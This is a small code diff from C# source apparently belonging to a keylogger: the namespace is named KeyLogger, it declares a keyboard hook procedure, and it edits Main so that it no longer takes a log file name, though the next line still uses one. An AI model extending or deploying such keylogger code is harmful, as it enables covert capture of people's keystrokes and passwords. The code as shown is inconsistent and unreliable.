@@ -17,7 +17,7 @@ namespace KeyLogger {
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
-    public static void Main(string[] args, string logFileName) {
+    public static void Main(string[] args) {
       /*logFileName = logFilePath;*/
       logFile = File.AppendText(logFileName);/*
       logFile.AutoFlush = true;
